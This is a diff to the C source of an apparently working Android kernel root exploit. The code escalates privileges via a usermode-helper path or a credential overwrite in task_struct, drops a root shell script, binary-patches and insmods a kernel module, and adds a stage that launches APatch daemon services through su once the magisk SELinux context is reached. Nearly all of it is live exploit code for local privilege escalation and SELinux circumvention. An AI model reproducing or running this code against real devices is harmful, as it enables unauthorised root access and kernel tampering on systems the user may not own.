@@ -302,6 +302,43 @@ static int wait_for_ksu_status(void) {
   return 1;
 }
 
+/* Runs in the parent (u:r:shell:s0) context, AFTER root_script has launched
+ * apd late-load and reported ready. From here su properly transitions to
+ * u:r:magisk:s0, so we poll for that, then run services + boot-completed
+ * through su. This MUST NOT live in root_script (u:r:kernel:s0): sucompat
+ * short-circuits su for uid-0 callers there and never reaches magisk:s0. */
+static void run_apd_services_stage(void) {
+  pr_info("[*] apd services stage: polling su (shell context) -> services\n");
+  int rc = system(
+    "sleep 10\n"
+    "setsid sh -c '\n"
+    "i=0; ctx=\"\"\n"
+    "while [ $i -lt 90 ]; do\n"
+    "  ctx=$(su -c id 2>/dev/null)\n"
+    "  echo \"$ctx\" | grep -q \"u:r:magisk:s0\" && break\n"
+    "  i=$((i+1)); sleep 1\n"
+    "done\n"
+    "enf=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+    "echo \"su ready after ${i}s (ctx=$ctx enforce=$enf)\"\n"
+    "if echo \"$ctx\" | grep -q \"u:r:magisk:s0\"; then\n"
+    "  su -c \"/data/adb/apd services\" &\n"
+    "  su -c \"/data/adb/apd boot-completed\" &\n"
+    "else\n"
+    "  echo \"su never reached magisk:s0 after ${i}s, skipping services\"\n"
+    "fi\n"
+    "exit 0\n"
+    "' </dev/null");
+  if (rc == -1)
+    pr_error("[!] apd services stage failed to spawn shell\n");
+}
+
+static int finish_exploit(void) {
+  int rc = wait_for_ksu_status();
+  if (rc == 0)
+    run_apd_services_stage();
+  return rc;
+}
+
 static void slab_drain(void) {
   struct timespec up;
   clock_gettime(CLOCK_BOOTTIME, &up);
@@ -344,12 +381,6 @@ static void write_root_script(void) {
     "diag '[+] root shell pid='$$' uid='$(id -u)\n"
     "diag '[*] selinux enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)' getenforce='$(getenforce 2>/dev/null)\n"
     "\n"
-    "# ---- load kernelpatch.ko ----\n"
-    "# Two load strategies, toggled by USE_KO_PATCH:\n"
-    "#   0 (default): insmod the unmodified template with kln=<addr> param.\n"
-    "#                Verified stable on this device.\n"
-    "#   1          : binary-patch the KPLNSLOT slot in the .ko, then bare insmod.\n"
-    "#                Suspected of causing the insmod panic; kept for A/B testing.\n"
     "USE_KO_PATCH=0\n"
     "KO_SRC=/data/local/tmp/android16-6.12_kernelpatch.ko\n"
     "KO_DST=/data/adb/ap/android16-6.12_kernelpatch.ko\n"
@@ -384,7 +415,6 @@ static void write_root_script(void) {
     "  done\n"
     "  printf '%b' \"$ESC\" | dd of=\"$KO_DST\" bs=1 seek=\"$OFF\" count=8 conv=notrunc 2>/dev/null\n"
     "  diag \"patched kln=$KLN at file offset 0x$(printf '%x' \"$OFF\")\"\n"
-    "  # read-back verify: the 8 bytes at OFF must equal KLN little-endian\n"
     "  _rb=$(dd if=\"$KO_DST\" bs=1 skip=\"$OFF\" count=8 2>/dev/null | od -An -tx1 | tr -d ' \\n')\n"
     "  _exp=\"\"\n"
     "  j=0\n"
@@ -407,15 +437,13 @@ static void write_root_script(void) {
     "diag \"insmod ok\"\n"
     "diag '=== [8] dmesg ==='\n"
     "dmesg | grep -i kernelpatch | tail -15\n"
-    "/data/adb/apd post-fs-data\n"
-    "/data/adb/apd late-load\n"
-    "sleep 5\n"
-    "/data/adb/apd services\n"
-    "/data/adb/apd boot-completed\n"
-    // "setenforce 1\n"
     "diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+    "/data/adb/apd post-fs-data\n"
     "report_status ready\n"
-    "diag '[+] done'\n";
+    "diag '[+] root channel ready; launching apd late-load'\n"
+    "setsid sh -c '/data/adb/apd late-load' </dev/null &\n"
+    "diag '[*] late-load in its own session pid='$!\n"
+    "exit 0\n";
   write(sfd, script, strlen(script));
   close(sfd);
 }
@@ -593,7 +621,7 @@ int run_exploit(int argc, char **argv) {
     pr_success("UMH root done — skipping W2\n");
     TIMER("exploit complete (UMH)");
     pr_info("waiting for KernelSU helper...\n");
-    return wait_for_ksu_status();
+    return finish_exploit();
   }
 
   /* Phase 2 fallback: Find child task_struct + cred overwrite */
@@ -658,7 +686,7 @@ int run_exploit(int argc, char **argv) {
   TIMER("exploit complete");
 
   pr_info("waiting for KernelSU helper...\n");
-  return wait_for_ksu_status();
+  return finish_exploit();
 }
 
 int install_embedded_wallpaper(void) { return 0; }
